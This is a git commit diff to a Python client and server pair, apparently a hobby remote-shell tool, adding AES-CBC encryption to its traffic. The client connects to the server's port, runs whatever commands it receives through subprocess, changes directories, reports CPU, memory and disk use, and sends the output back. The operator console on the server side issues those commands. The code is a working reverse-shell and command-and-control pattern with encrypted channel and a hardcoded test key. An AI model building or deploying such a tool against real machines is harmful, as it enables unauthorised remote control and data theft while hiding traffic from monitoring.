1f09f8602c3efc5f3ae1914109d654062abe14fa
whoami <shivagogo087@gmail.com>
2024-12-19 03:03:05 +0530

    Added AES encryption b/w data-transfer

--- client_1.py
+++ client_1.py
@@ -4,47 +4,86 @@ import subprocess
 import os
 import logging
 import psutil
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+
+
+def aes_encrypt(plaintext, key):
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+    return cipher.iv + ct_bytes
+
+def aes_decrypt(ciphertext, key):
+    iv = ciphertext[:AES.block_size]
+    ct = ciphertext[AES.block_size:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
+    return decrypted.decode()
+
+key = b'just for test123'
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 HOST = "localhost"
 PORT = 6969
 
-s.connect((HOST, PORT))
+try:
+    s.connect((HOST, PORT))
+    logging.info("Connected to server at %s:%s", HOST, PORT)
+except Exception as e:
+    logging.error("Connection failed: %s", e)
+    exit(1)
 
 def send(data):
     msg = json.dumps(data)
-    s.send(msg.encode())
+    encrypted_msg = aes_encrypt(msg, key)
+    s.send(encrypted_msg)
 
 def recv() -> str:
-    data = ""
-    while True:
-        try:
-            data = data + s.recv(1024).decode().rstrip()
-            return json.loads(data) 
-        except ValueError:
-            continue
+    data = b""
+    try:
+        while True:
+            chunk = s.recv(1024)
+            if not chunk:
+                break
+            data += chunk
+            try:
+                decrypted = aes_decrypt(data, key)
+                return json.loads(decrypted)
+            except ValueError:
+                continue
+    except Exception as e:
+        return None
 
 def shell():
-    while True:
-        command = recv()
-        if command.startswith("cd"):
-            try:
-                os.chdir(command.split()[1])
-                output = f"changed to {os.getcwd()}"
-            except:
-                output = "No such path exists...."
-        elif command == "Utils":
-            output = f"####CPUM#### {str(psutil.cpu_percent())}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}"
+    try:
+        while True:
+            command = recv()
+            if not command:
+                logging.info("No command received. Closing connection.")
+                break
+            
+            if command.startswith("cd"):
+                try:
+                    os.chdir(command.split(maxsplit=1)[1])
+                    output = f"Changed to {os.getcwd()}"
+                except Exception as e:
+                    output = f"Error: {e}"
+            elif command.lower() == "utils":
+                output = ("####CPUM#### " + f"{psutil.cpu_percent(interval=1)}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}")
+            else:
+                try:
+                    output = subprocess.getoutput(command)
+                except Exception as e:
+                    output = f"Error executing command: {e}"
+            
+            send(output)
+    except Exception as e:
+        logging.error("Error in shell loop: %s", e)
+    finally:
+        s.close()
+        logging.info("Connection closed.")
 
-        else:
-            output = subprocess.getoutput(command)
-
-        send(output)
-
-shell()
-    
-
-
-
-
+if __name__ == "__main__":
+    shell()
--- server_1.py
+++ server_1.py
@@ -5,8 +5,33 @@ from rich.console import Console
 from rich.table import Table
 from rich.live import Live
 import time
+from Crypto.Cipher import AES
+import logging
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
 
-def rich_stats(cpu_percent, V_ram, dsk_usage):
+def aes_encrypt(plaintext, key):
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+    return cipher.iv + ct_bytes
+
+def aes_decrypt(ciphertext, key):
+    iv = ciphertext[:AES.block_size]
+    ct = ciphertext[AES.block_size:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
+    return decrypted.decode()
+# key = get_random_bytes(16)
+key = b'just for test123'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+HOST = "localhost"
+PORT = 6969
+s.bind((HOST, PORT))
+s.listen(1)
+conn, addr = s.accept()
+
+def show_stats(cpu_percent, V_ram, dsk_usage):
     console = Console()
 
     def create_table():
@@ -22,41 +47,40 @@ def rich_stats(cpu_percent, V_ram, dsk_usage):
 
         console.print(create_table())
 
-
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-HOST = "localhost"
-PORT = 6969
-
-s.bind((HOST, PORT))
-s.listen(1)
-
-conn, addr = s.accept()
-
 def send(data):
     msg = json.dumps(data)
-    conn.send(msg.encode())
+    msg = aes_encrypt(msg, key)
+    conn.send(msg)
 
 def color_text(text, color):
     return termcolor.colored(text, color)
 
-print(color_text("this is just for test", "red"))
+
 def recv() -> str:
-    data = ""
-    while True:
-        try:
-            data = data + conn.recv(1024).decode().rstrip()
-            return json.loads(data) 
-        except ValueError:
-            continue
+    data = b""
+    try:
+        while True:
+            chunk = conn.recv(1024)
+            if not chunk:
+                break
+            data += chunk
+            try:
+                decrypted = aes_decrypt(data, key)
+                return json.loads(decrypted)
+            except (ValueError, json.JSONDecodeError):
+                continue
+    except Exception as e:
+        return None
+
+
+print(color_text("this is just for test", "red"))
 while True:
     prompt = input("[" + color_text("*", "blue")+ "]"+ color_text("Connected to ", "green") + f"{addr}~ ")
     send(prompt)
     from_client = recv()
     if from_client.startswith("####CPUM#### "):
         initial = from_client.split("####CPUM#### ")[1].split("-")
-        rich_stats(initial[0], initial[1], initial[2])
+        show_stats(initial[0], initial[1], initial[2])
     else:
         print(from_client)
 
